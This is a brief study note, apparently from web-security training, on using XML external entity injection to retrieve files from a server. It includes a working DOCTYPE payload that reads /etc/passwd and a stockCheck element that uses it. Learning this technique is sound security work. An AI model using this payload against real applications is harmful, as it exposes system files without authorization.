## Retrieve Files
* Modify the XML in 2 ways
   	* Introduce/edit a DOCTYPE element defining entity containg path to the file
   	* Edit data value in the XML that is returned in applications response to make use of that entity.
   	* <!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
   	* <stockCheck><productId>&xxe;</productId></stockCheck>
* Good to check all data values in submitted XML

